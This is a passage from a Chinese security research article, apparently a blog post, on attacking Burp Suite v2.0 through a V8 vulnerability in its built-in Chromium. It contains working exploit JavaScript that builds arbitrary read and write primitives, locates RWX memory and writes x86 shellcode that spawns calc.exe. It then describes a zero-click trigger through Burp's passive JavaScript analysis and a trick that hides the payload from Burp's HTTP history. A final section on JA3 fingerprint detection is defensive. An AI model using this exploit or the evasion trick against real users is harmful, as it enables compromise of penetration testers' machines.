                    OptObj_idx_in_hign_mem = false;
                    OptObj_idx = a + 1;
                }
            }
        }
        if (backing_store_idx == -1) {
            log("[-] Can not find backing store !");
            return;
        } else
            log("[+] backing store idx: " + backing_store_idx +
                ", in " + (backing_store_in_hign_mem ? "high" : "low") + " place.");
        if (OptObj_idx == -1) {
            log("[-] Can not find Opt Obj !");
            return;
        } else
            log("[+] OptObj idx: " + OptObj_idx +
                ", in " + (OptObj_idx_in_hign_mem ? "high" : "low") + " place.");
        var backing_store = (backing_store_in_hign_mem ?
            f2u(big_arr[backing_store_idx])[1] :
            f2u(big_arr[backing_store_idx])[0]);
        log("[+] Origin backing store: " + hex(backing_store));
        var dataNearBS = (!backing_store_in_hign_mem ?
            f2u(big_arr[backing_store_idx])[1] :
            f2u(big_arr[backing_store_idx])[0]);
        function read(addr) {
            if (backing_store_in_hign_mem)
                big_arr[backing_store_idx] = u2f(addr, dataNearBS);
            else
                big_arr[backing_store_idx] = u2f(dataNearBS, addr);
            return data_view.getInt32(0, true);
        }
        function write(addr, msg) {
            if (backing_store_in_hign_mem)
                big_arr[backing_store_idx] = u2f(addr, dataNearBS);
            else
                big_arr[backing_store_idx] = u2f(dataNearBS, addr);
            data_view.setInt32(0, msg, true);
        }
        var OptJSFuncAddr = (OptObj_idx_in_hign_mem ?
            f2u(big_arr[OptObj_idx])[1] :
            f2u(big_arr[OptObj_idx])[0]) - 1;
        log("[+] OptJSFuncAddr: " + hex(OptJSFuncAddr));
        var OptJSFuncCodeAddr = read(OptJSFuncAddr + 0x18) - 1;
        log("[+] OptJSFuncCodeAddr: " + hex(OptJSFuncCodeAddr));
        var RWX_Mem_Addr = OptJSFuncCodeAddr + 0x40;
        log("[+] RWX Mem Addr: " + hex(RWX_Mem_Addr));
        var shellcode = new Uint8Array(
               [0x89, 0xe5, 0x83, 0xec, 0x20, 0x31, 0xdb, 0x64, 0x8b, 0x5b, 0x30, 0x8b, 0x5b, 0x0c, 0x8b, 0x5b,
                0x1c, 0x8b, 0x1b, 0x8b, 0x1b, 0x8b, 0x43, 0x08, 0x89, 0x45, 0xfc, 0x8b, 0x58, 0x3c, 0x01, 0xc3,
                0x8b, 0x5b, 0x78, 0x01, 0xc3, 0x8b, 0x7b, 0x20, 0x01, 0xc7, 0x89, 0x7d, 0xf8, 0x8b, 0x4b, 0x24,
                0x01, 0xc1, 0x89, 0x4d, 0xf4, 0x8b, 0x53, 0x1c, 0x01, 0xc2, 0x89, 0x55, 0xf0, 0x8b, 0x53, 0x14,
                0x89, 0x55, 0xec, 0xeb, 0x32, 0x31, 0xc0, 0x8b, 0x55, 0xec, 0x8b, 0x7d, 0xf8, 0x8b, 0x75, 0x18,
                0x31, 0xc9, 0xfc, 0x8b, 0x3c, 0x87, 0x03, 0x7d, 0xfc, 0x66, 0x83, 0xc1, 0x08, 0xf3, 0xa6, 0x74,
                0x05, 0x40, 0x39, 0xd0, 0x72, 0xe4, 0x8b, 0x4d, 0xf4, 0x8b, 0x55, 0xf0, 0x66, 0x8b, 0x04, 0x41,
                0x8b, 0x04, 0x82, 0x03, 0x45, 0xfc, 0xc3, 0xba, 0x78, 0x78, 0x65, 0x63, 0xc1, 0xea, 0x08, 0x52,
                0x68, 0x57, 0x69, 0x6e, 0x45, 0x89, 0x65, 0x18, 0xe8, 0xb8, 0xff, 0xff, 0xff, 0x31, 0xc9, 0x51,
                0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x89, 0xe3, 0x41, 0x51, 0x53, 0xff,
                0xd0, 0x31, 0xc9, 0xb9, 0x01, 0x65, 0x73, 0x73, 0xc1, 0xe9, 0x08, 0x51, 0x68, 0x50, 0x72, 0x6f,
                0x63, 0x68, 0x45, 0x78, 0x69, 0x74, 0x89, 0x65, 0x18, 0xe8, 0x87, 0xff, 0xff, 0xff, 0x31, 0xd2,
                0x52, 0xff, 0xd0, 0x90, 0x90, 0xfd, 0xff]
        );
        log("[+] writing shellcode ... ");
        for (let i = 0; i 
用户在通过Render功能渲染页面时触发v8漏洞成功执行shellcode。
## 四、进阶攻击
Render功能需要用户交互才能触发漏洞，相对来说比较鸡肋，能不能0click触发漏洞？答案是可以的。
Burp Suite v2.0的`Live audit from Proxy`被动扫描功能在默认情况下开启JavaScript分析引擎（JavaScript
analysis），用于扫描JavaScript漏洞。
其中JavaScript分析配置中，默认开启了动态分析功能（[dynamic analysis
techniques](https://portswigger.net/blog/dynamic-analysis-of-javascript)）、额外请求功能（Make requests for missing Javascript dependencies）
JavaScript动态分析功能会调用内置chromium浏览器对页面中的JavaScript进行DOM
XSS扫描，同样会触发页面中的HTML渲染、JavaScript执行，从而触发v8漏洞执行shellcode。
额外请求功能当页面存在script标签引用外部JS时，除了页面正常渲染时请求加载script标签，还会额外发起请求加载外部JS。即两次请求加载外部JS文件，并且分别执行两次JavaScript动态分析。
额外发起的HTTP请求会存在明文特征，后端可以根据该特征在正常加载时返回正常JavaScript代码，额外加载时返回漏洞利用代码，从而可以实现在Burp
Suite HTTP history中隐藏攻击行为。
    GET /xxx.js HTTP/1.1
    Host: www.xxx.com
    Connection: close
    Cookie: JSESSIONID=3B6FD6BC99B03A63966FC9CF4E8483FF
JavaScript动态分析 + 额外请求 + chromium漏洞组合利用效果：
![Kapture 2021-09-06 at
2.14.35](https://images.seebug.org/content/images/2021/09/06/1630918015000-8eimeg.png-w331s)
## 五、流量特征检测
默认情况下Java发起HTTPS请求时协商的算法会受到JDK及操作系统版本影响，而Burp
Suite自己实现了HTTPS请求库，其TLS握手协商的算法是固定的，结合JA3算法形成了TLS流量指纹特征可被检测，有关于JA3检测的知识点可学习《[TLS
Fingerprinting with JA3 and JA3S](https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967)》。
[Cloudflare](https://portswigger.net/daily-swig/https-everywhere-cloudflare-planning-improvements-to-middleware-detection-utility)开源并在CDN产品上应用了[MITMEngine](https://github.com/cloudflare/mitmengine)组件，通过TLS指纹识别可检测出恶意请求并拦截，其覆盖了大多数Burp
Suite版本的JA3指纹从而实现检测拦截。这也可以解释为什么在渗透测试时使用Burp Suite请求无法获取到响应包。
以Burp Suite v2.0举例，实际测试在各个操作系统下，同样的jar包发起的JA3指纹是一样的。
不同版本Burp Suite支持的TLS算法不一样会导致JA3指纹不同，但同样的Burp Suite版本JA3指纹肯定是一样的。如果需要覆盖Burp
Suite流量检测只需要将每个版本的JA3指纹识别覆盖即可检测Burp Suite攻击从而实现拦截。
本文章涉及内容仅限防御对抗、安全研究交流，请勿用于非法途径。
* * *